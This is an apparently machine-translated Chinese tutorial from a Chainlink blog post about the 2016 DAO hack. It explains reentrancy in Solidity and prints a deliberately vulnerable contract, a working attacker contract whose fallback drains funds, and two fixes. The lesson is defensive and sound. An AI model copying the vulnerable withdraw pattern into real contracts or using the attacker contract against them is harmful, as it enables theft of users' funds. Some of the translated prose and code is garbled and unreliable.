# 重入攻击和 DAO Hack

> 原文：<https://blog.chain.link/reentrancy-attacks-and-the-dao-hack/>

重入攻击，就像 DAO hack 中使用的那种，是由我们构造 Solidity 代码的方式中的漏洞造成的。

在这篇博客中，我们将探索有史以来最臭名昭著的 Solidity 黑客攻击之一，它发生在以太坊智能合约开发的形成时期。这种攻击利用可重入漏洞攻击一个名为 [的 DAO](https://en.wikipedia.org/wiki/The_DAO_(organization)) 的 DAO(去中心化自治组织)。黑客使用了一种通常被称为重入攻击的漏洞。

## 这是给谁的？

本博客假设你明白:

*   [区块链理工大学基础知识](https://blog.chain.link/what-is-blockchain/) ，具体来说 [以太坊](https://ethereum.org/en/what-is-ethereum/) 。
*   以太坊虚拟机(EVM)运行在以太坊节点上，是一个分散的同步状态机。
*   在以太坊的上下文中， [智能合约](https://chain.link/education/smart-contracts) 是指用 Solidity 语言编写并在 EVM 上执行的软件代码。
*   在以太坊的上下文中，单词“ [”账户](https://ethereum.org/en/developers/docs/accounts/#:~:text=An%20Ethereum%20account%20is%20an,or%20deployed%20as%20smart%20contracts.) ”是指可能具有以太网余额、在以太坊网络上发送交易的实体，并且具有两种类型——用户控制的或部署的智能合约。

你不需要任何关于可靠性的知识，因为代码示例是非常轻量级的。然而，基本掌握任何一种编程语言(静态或动态类型)都是有帮助的。

如果你愿意，你还可以在这里 [连同一个可重入攻击教程](https://youtu.be/ZrbDN9Svank) 。

[https://www.youtube.com/embed/ZrbDN9Svank?feature=oembed](https://www.youtube.com/embed/ZrbDN9Svank?feature=oembed)

## 刀客简史

到了 2015 年，新生的以太坊社区开始谈论[DAOs——去中心化的自治组织](https://blog.chain.link/how-chainlink-powers-decentralized-governance/#:~:text=March%2028%2C%202022%20Chainlink,points%20of%20authority%20or%20control.) 。这些以区块链为动力的社区背后的想法是，他们可以通过执行可验证的代码(特别是在以太坊区块链上运行的智能合同)和通过社区协议的分散决策来协调人类的努力。2016 年，以太坊主网一岁左右的时候，创造了一个名为“道”的道。这是一个分散的、由社区控制的投资基金。它通过出售自己的社区令牌筹集了价值 1.5 亿美元的以太网(约 354 万以太网)。人们通过存款 ETH 来购买 DAO 的社区令牌，ETH 成为 DAO 将代表其令牌持有投资者社区进行投资的投资基金。

由于以太坊、智能合约和 DAOs 的发展如此之早，人们对这些前所未有的组织和协调人类活动的方式感到非常兴奋。

不幸的是，DAO 推出后不到 3 个月，就遭到了 [【黑帽】黑客](https://en.wikipedia.org/wiki/Black_hat_(computer_security)) 的攻击。在接下来的几周里，黑客开始从 DAO 的智能合约中抽走价值 1 . 5 亿美元的 ETH 的大部分。黑客使用了一种被称为“重入”的攻击。这个名字是描述性的，我们将很快深入研究这种攻击的结构和技术。但你可以想象，这是一个非常严重的违反道，违反了投资者的信任，也是对以太坊信誉的重大打击。

这也造成了很深的意识形态分歧。尽管行业参与者和批评者眼睁睁地看着资金从 DAO 中流失，但对于最佳应对方式仍存在广泛的争论。在意识形态光谱的一端，有一种观点认为，密码启用区块链的承诺是它们的不变性和防篡改性。干预，即使是出于正当的理由，仍然是干预。一个真正不可信的防篡改系统不需要干预，即使后果很严重——这是分散防篡改的代价。

另一方面，人们的储蓄正被慢慢窃取，公众对区块链技术的信心和乐观情绪受到损害，这需要干预，即使只是为了保护人们不失去他们一生的储蓄，以及防止盗窃的道德义务。

随着这些争论愈演愈烈，一个名为 [【怀特哈特】](https://en.wikipedia.org/wiki/White_hat_(computer_security)) 的黑客组织被集结起来，作为一支反击力量。他们属于干预阵营，他们使用相同的黑客技术——可重入性利用——试图比攻击者更快地耗尽 DAO。这个想法是拯救这些基金，这样它们就可以返还给投资者。DAO 会员获得了大量退款，尽管许多投资者已经通过“逃生舱”退出了协议，让他们在退出时提取投资。

与此同时，由于黑客仍在流失数百万美元，以太坊核心团队面临着一个极具挑战性的决定。挫败黑客的一个办法就是用 [叉以太坊【区块链】](https://ethereum.org/en/history/) 。这就像改变历史，一个交替的现实在上演。在这个例子中，通过分叉以太坊，新的分叉将像黑客攻击从未发生一样运行，黑客非法获得的以太网将只在网络的遗留分叉上有效。如果用户采用了新的分叉而抛弃了旧的分叉，黑客的 ETH 就没什么价值了。这种分叉会使存储黑客攻击交易的历史块失效。但这一听起来极端的步骤完全违背了以太坊的基本原则——这种干预是以太坊想要废除的那种集中的、“单边”行动。

那些投票支持叉子的人是在支持一个将会有两个平行以太坊区块链的世界。这一票以 85%的票数胜出，分叉发生(尽管由于以太坊协议没有实际缺陷，部分 [矿工抵制](https://ethereum.org/en/history/#dao-fork) )。这也是为什么现在有两个以太坊链条——[以太坊经典](https://ethereumclassic.org/) 和我们今天所知道的以太坊链条。两者都有其原生的 ETH 代币，而这些代币在市场上有着非常不同的价格。可以在 这里看到以太坊基金会在 [分叉上的公告。](https://blog.ethereum.org/2016/07/20/hard-fork-completed/)

道具有重大的历史意义，而黑客以及由此产生的决策也成为了历史。

但是黑客到底是如何运作的呢？我们来探索一下。

## Solidity 中的重入攻击是什么？

在以太坊区块链上运行的应用程序被称为“智能合约”(尽管它们没有法律效力)。智能合约是一段段代码，通常用一种叫做 Solidity 的语言编写，在区块链上执行，可以与以太坊网络上的外部用户帐户和其他智能合约进行交互。智能契约之间的自由交互和可组合性是其设计的核心。在账户之间转移支付也是哲学的核心。这些原则都体现在 Solidity 语言在 [以太坊虚拟机](https://blog.chain.link/what-are-abi-and-bytecode-in-solidity/) 上的执行方式上。

可重入攻击利用了所谓的“回退”功能的工作方式。 [回退功能](https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function) 是 Solidity 中的特殊构造，在特定情况下触发。回退功能的特点有:

1.  他们没有名字。
2.  它们是从外部调用的(也就是说，它们不能从编写它们的契约内部调用)。
3.  每个合同可以有零个或一个后备功能，不能再多了。
4.  当另一个协定调用回退的封闭智能协定中的函数，但被调用的函数名称不匹配或不存在时，它们会被自动触发。
5.  如果 ETH 被发送到回退的封闭契约，并且没有附带的“[【calldata】](https://docs.soliditylang.org/en/v0.8.12/types.html?highlight=data%20location#data-location)”(类似于内存或存储的数据位置)，并且没有声明的 receive() 函数，也可以触发它们，在这种情况下，回退必须标记为才能触发和接收 ETH。
6.  回退功能可以包含任意逻辑。

可重入黑客利用的是回退功能的第五和第六个特性。黑客还依赖于受害者契约中的某种操作顺序。所以让我们来探索这是如何发生的。

在下面的插图中，红色和绿色的框是智能契约，为了让它更有趣，我以 DAO 及其著名的 hack 为背景展示了可重入攻击。这是一个高度简化的版本，只需要理解可重入性的基本要素，下面的代码与 DAO 的代码并不相似。

在我们的示例中，DAO 的智能合约维护一个名为 余额 的状态变量，该变量跟踪每个投资者在 DAO 中的投资。这与智能合约的 ETH 余额不同，后者不存储在状态变量中。

黑客部署了一个充当“投资者”的智能契约，该契约将一些 ETH 存放到 DAO 中。这使得黑客可以在以后调用 DAO 的智能契约中的 撤回() 函数。当receive()函数最终被调用时，DAO 的契约将 ETH 发送给黑客。但是黑客的 smart contract 故意没有一个 receive() 函数，所以当它接收到来自 withdraw 请求的 ETH 时，黑客的 fallback 函数就被触发了。这个回退函数本来可以是空的，但仍然接收 ETH，但它包含一些恶意代码。

这段代码执行后，立即再次调用 DAO 的智能合约的 的【撤回() 函数。这引发了一个调用循环，因为此时对 withdraw() 的第一个调用仍在执行。只有当黑客协定的回退函数完成时，它才会完成执行，但它已经重新调用了【retain()， ，这启动了黑客协定和 DAO 的智能协定之间的嵌套调用循环。

![A diagram of how the reentrancy attack works](img/9628c241d4d78da2e7adcc6579422d6f.png)

每次 取款() 被调用时，DAO 的智能合约会尝试向黑客发送相当于黑客押金的 ETH。但是，至关重要的是，它不会更新黑客的帐户余额，直到 发送 ETH 的交易完成后 *。但是直到黑客的回退功能完成执行，ETH 发送事务才能完成。因此，DAO 的合同继续向黑客发送越来越多的 ETH，而不会减少黑客的余额，从而耗尽 DAO 的资金。*

在下面的代码演练中，这将变得更容易理解。

## 重入攻击代码示例

让我们从 DAO 的代码开始，在代码中，特定的操作顺序产生了易受重入攻击的漏洞。

```
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.10;

 contract Dao {
mapping(address => uint256) public balances;

    function deposit() public payable {
 require(msg.value >= 1 ether, "Deposits must be no less than 1 Ether");
 balances[msg.sender] += msg.value;
    }

 function withdraw() public {
 // Check user's balance
 require(
 balances[msg.sender] >= 1 ether,
 "Insufficient funds.  Cannot withdraw"
 );
 uint256 bal = balances[msg.sender];

 // Withdraw user's balance
 (bool sent, ) = msg.sender.call{value: bal}("");
 require(sent, "Failed to withdraw sender's balance"); 
 // Update user's balance.
 balances[msg.sender] = 0;
 }

 function daoBalance() public view returns (uint256) {
 return address(this).balance;
 }
} 
```

注意以下事项:

*   智能合约维护投资者地址和 ETH 余额的映射。被投资的 ETH 是在合约本身的余额中持有，这与 余额 状态变量不同。
*   deposit() 要求最低出资 1 ETH，一旦收到出资，就增加投资者的余额。
*   撤回() 函数将撤回的 ETH 发送给投资者(使用msg . sender . call)*在* 之前将他们的余额重置为零。直到黑客的回退函数完成执行，发送事务才完成执行，因此直到回退函数完成，黑客的余额才被设置为零。这是 DAO 契约中的主要漏洞。

现在让我们来看看黑客的智能合同，它执行了漏洞利用。

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IDao {
 function withdraw() external ;
 function deposit()external  payable;  }

contract Hacker{
 IDao dao; 
 constructor(address _dao){
 dao = IDao(_dao);
    }

 function attack() public payable {
 // Seed the Dao with at least 1 Ether.
 require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
        dao.deposit{value: msg.value}();

 // Withdraw from Dao.
 dao.withdraw();
    }

 fallback() external payable{
 if(address(dao).balance >= 1 ether){
 dao.withdraw();
 }
    }

 function getBalance()public view returns (uint){
 return address(this).balance;
 }
}
```

此处需要注意的事项:

*   攻击() 函数将黑客的“投资”存放在 DAO 中，然后通过调用 DAO 契约的 撤回() 函数来启动攻击，这一点我们在上一段中已经解构过了。
*   回退 功能包含了恶意代码。它检查 DAO 的契约中是否还有 ETH，然后调用 DAO 契约的 withdraw() 函数。我们在上一段中看到，只要 ETH-sending 事务仍在执行，DAO 契约的 withdraw() 函数就不会更新黑客的帐户余额。而那个交易一直执行，是因为黑客的回退函数一直调用 withdraw() 。这将耗尽 DAO 合同的 ETH 余额，而不会更新 余额 状态变量。
*   一旦刀合约的 ETH 余额被耗尽， fallback() 函数将不再执行 withdraw() 函数，最终！)完成 fallback() 函数的执行，这将结束 ETH-send 事务。只有到那时，黑客的帐户余额才会被重置为零，到那时，DAO 将没有 ETH 了。

## 修复重入漏洞

有几种方法可以修复可重入性漏洞，但在我们的示例中，最简单的修复方法实际上是改变 DAO 的函数中的操作顺序，这样调用者的余额在 之前被重置为 0 *，DAO 契约使用底层的 调用 函数发送它们的以太网。它看起来像这样:*

```
Contract Dao {
… 
 function withdraw() public {
 // Check user's balance
 require(
 balances[msg.sender] >= 1 ether,
 "Insufficient funds.  Cannot withdraw"
 );
 uint256 bal = balances[msg.sender]; 
 // Update user's balance.
 balances[msg.sender] = 0;

 // Withdraw user's balance
 (bool sent, ) = msg.sender.call{value: bal}("");
 require(sent, "Failed to withdraw sender's balance");

        // Update user's balance.
        ~~balances[msg.sender] = 0;~~
 }
}
```

这样，当低级 call() 函数触发黑客契约的 fallback() 函数，并且该函数试图重新进入 【撤回() 函数时，黑客的余额在重新进入时为零，并且 require() 方法将计算为 false，从而将交易恢复到那里。这将随后导致原来调用 的 call() 移至 return，并且由于它失败了的值将为 假， 将导致下一行( require(已发送，“未能提取发送方的余额”)； )进行还原。

黑客会取走他们的存款，仅此而已。

另一个选项是 DAO 契约使用 [函数修饰符](https://docs.soliditylang.org/en/v0.8.12/contracts.html#function-modifiers) 来“锁定”仍在执行的 撤回() 函数，从而通过锁定来阻止任何重入。我们将通过向 DAO 契约添加这些行来实现这一点。
T12】

```
Contract Dao {
 bool internal locked; 
 modifier noReentrancy() {
 require(!locked, "No reentrancy");
 locked = true;
 _;
 locked = false;
    }

 //……
    function withdraw() public noReentrancy { 

  // withdraw logic goes here…

 }
}
```

这种重入保护使用所谓的 [互斥(互斥)标志模式](https://stackoverflow.com/questions/34524/what-is-a-mutex) 来保护“撤回()”函数在前一次调用未完成时不被调用。因此，当黑客契约的“fallback()”函数试图通过“withdraw()”函数重新进入 DAO 时，函数修饰符将被触发，其“require()”函数将导致一个带有消息“不可重入”的恢复。

## 结论

当然，这是一个高度简化的演练，它使用示例代码而不是生产示例来解释可重入性利用的概念。虽然我使用 DAO 作为背景来解释可重入性，但是 DAO 的实际代码是非常不同的。然而，DAO 黑客是基于“可重入性”原则的，因为黑客递归地提取资金而不更新其余额。您可以检查 DAO 的 GitHub[repo](https://github.com/blockchainsllc/DAO)并在 [提交历史](https://github.com/blockchainsllc/DAO/commit/9c822ba54c9c2b9ae0433ab2358c52a19e5fb2fe) 中查看平衡更新逻辑的修复尝试。

如果您是一名开发人员，并且想要保护您的智能合约、dApp 或协议，请考虑在您的智能合约应用程序中使用 Chainlink。更多学习和参考资源，请查看 [【区块链教育中心】](https://blockchain.education)[开发者文档](https://docs.chain.link/docs) ，或 [联系专家](https://chainlink.typeform.com/to/gEwrPO) 。你也可以通过 [分散式预言](https://docs.chain.link/docs/conceptual-overview/) 将你的智能合约与现实世界的数据连接起来。